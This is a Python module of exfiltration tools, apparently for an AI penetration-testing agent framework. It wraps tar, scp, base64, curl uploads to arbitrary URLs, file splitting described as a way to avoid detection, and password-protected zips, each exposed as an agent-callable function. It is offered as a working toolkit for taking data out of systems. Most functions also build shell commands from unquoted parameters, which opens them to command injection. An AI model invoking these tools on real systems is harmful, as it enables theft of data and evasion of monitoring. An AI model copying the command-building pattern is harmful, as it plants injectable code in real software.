"""
Data exfiltration tools
=======================

This module contains helper functions to assist with the data
exfiltration phase of a penetration test.  They cover common tasks
such as archiving files and transferring them over secure channels.

Use these functions responsibly and only on systems for which you
have explicit authorisation.  The authors do not condone illegal
activities.
"""

from cai.tools.common import run_command  # pylint: disable=import-error
from cai.sdk.agents import function_tool  # pylint: disable=import-error


@function_tool
def compress_directory(directory: str, archive_name: str = "archive.tar.gz", ctf=None) -> str:
    """Create a ``.tar.gz`` archive from a directory.

    This helper uses ``tar`` to recursively archive the contents of
    ``directory`` into a single compressed file named ``archive_name``.
    If ``directory`` is a relative path, it will be interpreted
    relative to the current working directory.  The archive is
    written to the current working directory unless ``archive_name``
    specifies an absolute path.

    Args:
        directory: Path to the directory whose contents should be
            archived.
        archive_name: Name (or path) of the resulting archive file.
        ctf: Optional CTF sandbox context.

    Returns:
        The command output, which is usually empty if the archive
        succeeds.  Any errors from tar will be returned verbatim.
    """
    # Use -C to change into the directory so that the archive contains
    # relative paths rather than absolute ones
    cmd = f"tar czf {archive_name} -C {directory} ."
    return run_command(cmd, ctf=ctf)


@function_tool
def scp_upload(local_file: str, remote_path: str, user: str, host: str, port: str = "22", identity_file: str = "", ctf=None) -> str:
    """Upload a file to a remote host using ``scp``.

    This function wraps the ``scp`` command to copy a local file to a
    remote machine over SSH.  You can specify a non‑default port and
    optionally an identity file for key‑based authentication.  If
    ``remote_path`` is a directory, scp will write the file there
    retaining its original name.

    Args:
        local_file: Path to the local file to upload.
        remote_path: Remote file path or directory where the file
            should be placed.
        user: Username on the remote host.
        host: Hostname or IP address of the destination.
        port: SSH port number (default ``22``).
        identity_file: Path to an SSH private key (optional).
        ctf: Optional CTF sandbox context.

    Returns:
        The output from ``scp``; errors are returned verbatim.
    """
    scp_parts = ["scp", "-P", port]
    if identity_file:
        scp_parts += ["-i", identity_file]
    scp_parts += [local_file, f"{user}@{host}:{remote_path}"]
    cmd = " ".join(scp_parts)
    return run_command(cmd, ctf=ctf)


@function_tool
def scp_download(remote_file: str, local_path: str, user: str, host: str, port: str = "22", identity_file: str = "", ctf=None) -> str:
    """Download a file from a remote host using ``scp``.

    This function is the inverse of :func:`scp_upload`.  It copies a
    file from a remote host to a local path.  If ``local_path`` is a
    directory, the remote file will be placed inside it with its
    original filename.

    Args:
        remote_file: Path to the file on the remote host.
        local_path: Local path or directory where the file should be
            stored.
        user: Username on the remote host.
        host: Hostname or IP address.
        port: SSH port number (default ``22``).
        identity_file: Path to an SSH private key (optional).
        ctf: Optional CTF sandbox context.

    Returns:
        The output from ``scp``; errors are returned verbatim.
    """
    scp_parts = ["scp", "-P", port]
    if identity_file:
        scp_parts += ["-i", identity_file]
    scp_parts += [f"{user}@{host}:{remote_file}", local_path]
    cmd = " ".join(scp_parts)
    return run_command(cmd, ctf=ctf)


@function_tool
def base64_encode_file(file_path: str, ctf=None) -> str:
    """Return the base64 representation of a file.

    Base64 encoding can be useful for exfiltrating small files over
    channels that only accept text data.  This helper reads a file
    and outputs its base64‑encoded contents.  On large files this
    may produce a lot of output.

    Args:
        file_path: Path to the file to encode.
        ctf: Optional CTF sandbox context.

    Returns:
        The base64 encoded contents of the file.
    """
    return run_command(f"base64 {file_path}", ctf=ctf)


# ---------------------------------------------------------------------------
# Extended functionality
# ---------------------------------------------------------------------------


@function_tool
def upload_http(url: str, file_path: str, field_name: str = "file", ctf=None) -> str:
    """Upload a file to an HTTP endpoint using ``curl``.

    This helper performs a multipart/form‑data POST request to send a
    file to a web server.  It uses ``curl``'s ``-F`` option to send
    the file as a form field.  Ensure that you have permission to
    upload to the target URL.

    Args:
        url: The full URL to which the file should be uploaded.
        file_path: Path to the local file to upload.
        field_name: Name of the form field used in the request
            (default "file").
        ctf: Optional CTF sandbox context.

    Returns:
        The response from the server.
    """
    cmd = f"curl -X POST -F '{field_name}=@{file_path}' {url}"
    return run_command(cmd, ctf=ctf)


@function_tool
def split_file(file_path: str, chunk_size_mb: int = 10, ctf=None) -> str:
    """Split a large file into smaller chunks.

    Sometimes exfiltration must occur in smaller pieces to avoid size
    restrictions or detection.  This function uses ``split`` to break
    a file into chunks of a given size (in megabytes).  The chunks
    will be created in the current directory with names based on the
    original file.

    Args:
        file_path: Path to the file to split.
        chunk_size_mb: Size of each chunk in megabytes (default 10MB).
        ctf: Optional CTF sandbox context.

    Returns:
        Output from the ``split`` command (usually empty).
    """
    # Determine prefix for output files by stripping common extensions
    import os
    base = os.path.basename(file_path)
    prefix = f"{base}.part"
    cmd = f"split -b {chunk_size_mb}M {file_path} {prefix}"
    return run_command(cmd, ctf=ctf)


@function_tool
def compress_and_encrypt(directory: str, archive_name: str = "archive.zip", password: str = "", ctf=None) -> str:
    """Compress a directory and optionally protect it with a password.

    This helper uses the ``zip`` command to recursively compress the
    contents of a directory.  If a password is provided, it will be
    applied to the archive.  Note that not all versions of ``zip``
    support encryption; ensure that your environment includes a
    compatible implementation.

    Args:
        directory: Directory to compress.
        archive_name: Name of the resulting ZIP file (default
            ``archive.zip``).
        password: Optional password to protect the ZIP file.  If
            omitted or empty, the archive will not be encrypted.
        ctf: Optional CTF sandbox context.

    Returns:
        Output from the ``zip`` command.
    """
    # Build the zip command.  Use -r for recursion and -P for password.
    # Quote the directory to handle spaces.
    import shlex
    quoted_dir = shlex.quote(directory)
    if password:
        cmd = f"zip -r -P {shlex.quote(password)} {archive_name} {quoted_dir}"
    else:
        cmd = f"zip -r {archive_name} {quoted_dir}"
    return run_command(cmd, ctf=ctf)